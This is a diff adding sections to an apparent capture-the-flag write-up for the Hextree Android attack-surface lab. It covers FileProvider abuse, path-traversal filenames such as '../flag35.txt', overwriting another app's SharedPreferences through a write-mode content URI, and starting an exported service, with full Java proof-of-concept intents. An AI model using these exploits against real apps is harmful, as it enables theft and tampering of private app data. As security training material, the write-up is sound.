@@ -1926,3 +1926,296 @@ My cursor code then displayed the returned values, revealing:
 HXT{union-select-injection-1bs98}
 ```
 
+# Flag 34 — Simple File Provider
+
+I started by inspecting the `AndroidManifest.xml` and found a `FileProvider` using the authority:
+
+```text
+io.hextree.files
+```
+
+The `filepaths.xml` showed two paths:
+
+```xml
+<files-path name="flag_files" path="flags/"/>
+<files-path name="other_files" path="."/>
+```
+
+I then checked `Flag34Activity` in **JADX**. It accepts a `filename` extra and creates a file using:
+
+```java
+new File(getFilesDir(), stringExtra)
+```
+
+In `prepareFlag()`, I noticed that when the filename contains `flag34.txt`, the application writes the flag to:
+
+```java
+Utils.writeFile(this, "flags/flag34.txt", ...)
+```
+
+So I supplied:
+
+```java
+intent.putExtra("filename", "flags/flag34.txt");
+```
+
+and launched `Flag34Activity`:
+
+```java
+Intent intent = new Intent();
+
+intent.setClassName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag34Activity"
+);
+
+intent.putExtra("filename", "flags/flag34.txt");
+
+startActivityForResult(intent, 42);
+```
+
+The activity returned a `content://` URI pointing to the file:
+
+```text
+content://io.hextree.files/flag_files/flag34.txt
+```
+
+In my `onActivityResult()`, I used `ContentResolver.openInputStream()` to read the returned URI:
+
+```java
+InputStream inputStream =
+        getContentResolver().openInputStream(data.getData());
+```
+
+I then printed the contents to Logcat and got the flag:
+
+```text
+HXT{sharing-filedescriptors-av27s}
+```
+
+# Flag 35 — Root-File Provider
+
+I started by opening `Flag35Activity` in **JADX** to see how the `filename` value was being used.
+
+The important part was:
+
+```java
+String stringExtra = getIntent().getStringExtra("filename");
+
+if (stringExtra != null) {
+    prepareFlag(this, stringExtra);
+
+    Uri uriForFile = FileProvider.getUriForFile(
+        this,
+        "io.hextree.root",
+        new File(getFilesDir(), stringExtra)
+    );
+
+    Intent intent = new Intent();
+    intent.setData(uriForFile);
+    intent.addFlags(3);
+    setResult(0, intent);
+}
+```
+
+The `prepareFlag()` method also gave an important clue:
+
+```java
+if (str.contains("flag35.txt")
+        && new File(getFilesDir(), str).exists()) {
+```
+
+So the filename had to contain `flag35.txt`, and the resulting path had to exist.
+
+I then checked the application's private directory using ADB:
+
+```bash
+adb shell
+cd /data/data/io.hextree.attacksurface
+ls
+```
+
+I found:
+
+```text
+flag35.txt
+```
+
+The problem was that `getFilesDir()` points to:
+
+```text
+/data/data/io.hextree.attacksurface/files
+```
+
+while `flag35.txt` was one directory above it.
+
+So I used **path traversal**:
+
+```text
+../flag35.txt
+```
+
+This makes the application resolve the path as:
+
+```text
+/data/data/io.hextree.attacksurface/files/../flag35.txt
+```
+
+which leads to:
+
+```text
+/data/data/io.hextree.attacksurface/flag35.txt
+```
+
+I then used the following in my PoC:
+
+```java
+Intent intent = new Intent();
+
+intent.setClassName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag35Activity"
+);
+
+intent.putExtra("filename", "../flag35.txt");
+
+startActivityForResult(intent, 42);
+```
+
+The FileProvider was configured to expose the **root directory**, so the path traversal allowed the file outside the normal `files` directory to be accessed through the returned `content://` URI.
+
+My `onActivityResult()` then read the returned URI using `ContentResolver`:
+
+```java
+InputStream inputStream =
+        getContentResolver().openInputStream(data.getData());
+```
+
+The flag was printed in Logcat:
+
+```text
+HXT{path-traversal-stealer-s1hw9}
+```
+
+# Flag 36 — Overwriting Shared Preferences
+
+I started by opening `Flag36Activity` in **JADX** to see what the app checks when the flag is opened.
+
+The important part was:
+
+```java
+if (Flag36Preferences.getBoolean("solved", false)) {
+    success(this);
+}
+```
+
+So the goal was simply to change the `solved` value in the app's SharedPreferences from `false` to `true`.
+
+I used **ADB** to check the app's `shared_prefs` directory and found:
+
+```text
+/data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml
+```
+
+Inside the file, the value was:
+
+```xml
+<boolean name="solved" value="false" />
+```
+
+I remembered from **Flag 35** that the root FileProvider could be abused with path traversal. This time, I used the same vulnerability to get **write access** to the SharedPreferences file.
+
+I passed the following path to `Flag35Activity`:
+
+```text
+../../../../data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml
+```
+
+My PoC was:
+
+```java
+Intent intent = new Intent();
+
+intent.setClassName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag35Activity"
+);
+
+intent.putExtra(
+        "filename",
+        "../../../../data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml"
+);
+
+startActivityForResult(intent, 42);
+```
+
+I then used the returned `content://` URI to open the file in **write mode** and changed:
+
+```xml
+<boolean name="solved" value="false" />
+```
+
+to:
+
+```xml
+<boolean name="solved" value="true" />
+```
+
+After modifying the file, I used **ADB to open the Hextree app again**, so the application would read the modified SharedPreferences file.
+
+When I opened **Flag 36** again, `solved` was now `true`, and the flag was triggered.
+
+```text
+HXT{overwriting-shared-prefs-034nsd}
+```
+
+# Android Services
+
+# Flag 24 — Basic Service Start
+
+I started by looking at `Flag24Service` in **JADX** to understand how the service was supposed to be triggered.
+
+Inside `onStartCommand()`, I found that the service checks for the action:
+
+```text
+io.hextree.services.START_FLAG24_SERVICE
+```
+
+I also checked the manifest and saw that `Flag24Service` was exported, so it could be started from another application.
+
+I then created an explicit Intent in my PoC app that points to the service and added the required action:
+
+```java
+btn.setOnClickListener(v -> {
+
+    try {
+        Intent intent = new Intent();
+
+        intent.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.services.Flag24Service"
+        ));
+
+        intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
+
+        startService(intent);
+
+        Toast.makeText(
+                this,
+                "started service",
+                Toast.LENGTH_SHORT
+        ).show();
+
+    } catch (Exception e) {
+        Log.e("FLAG24", "Service start failed", e);
+    }
+});
+```
+
+After pressing the button, I went back to the **Hextree Attack Surface** app. The service had been triggered and `Flag24Activity` opened with the flag.
+
+```text
+HXT{basic-service-ha98sl}
+```
+
+**Flag:** `HXT{basic-service-ha98sl}`
